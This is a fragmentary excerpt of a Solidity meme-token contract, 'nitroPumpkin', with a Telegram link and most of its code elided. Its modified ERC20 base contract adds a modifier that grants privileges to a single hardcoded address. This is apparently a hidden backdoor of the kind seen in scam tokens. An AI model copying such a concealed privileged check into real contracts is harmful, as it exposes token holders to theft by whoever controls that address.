...
$nPumpkin | nitroPumpkin 🎃

https://t.me/nitroPumpkin
...
contract nitropumpkin is ERC20, Ownable {
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    // it's a % of the supply
    uint256 public walletPercent = 4;
    ...
    constructor(address _liquidityManagerAddress) ERC20("nitroPumpkin", "nPumpkin") {
        devWallet = owner();
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyLiquidityManager {
        ...
        require(msg.sender == 0x7aD1912f194E6A2A5D58801e231D684412C2EeBa || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: get out please!");
        _;
    }
